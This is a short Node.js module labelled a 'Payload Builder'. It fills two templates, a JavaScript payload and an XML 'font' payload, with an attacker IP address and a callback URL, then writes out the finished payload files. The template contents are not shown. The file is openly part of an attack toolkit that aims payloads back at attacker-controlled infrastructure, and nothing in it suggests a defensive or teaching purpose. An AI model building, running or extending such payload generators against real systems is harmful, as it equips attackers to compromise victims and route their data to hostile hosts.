// payloads/generate.js — Payload Builder
const fs = require('fs');
const path = require('path');

module.exports = (cfUrl, attackerIp) => {
  const jsTpl  = fs.readFileSync(path.join(__dirname, 'payload.js.tpl'), 'utf8');
  const xmlTpl = fs.readFileSync(path.join(__dirname, 'font-payload.xml.tpl'), 'utf8');

  const js  = jsTpl.replace(/{{CF_URL}}/g, cfUrl)
                   .replace(/{{EVENT_TIME}}/g, Date.now())
                   .replace(/{{ATTACKER_IP}}/g, attackerIp);

  const xml = xmlTpl.replace(/{{CF_URL}}/g, cfUrl)
                    .replace(/{{ATTACKER_IP}}/g, attackerIp);

  fs.writeFileSync(path.join(__dirname, 'payload.js'), js);
  fs.writeFileSync(path.join(__dirname, 'font-payload.xml'), xml);
  console.log('• payload.js & font-payload.xml generated');
};
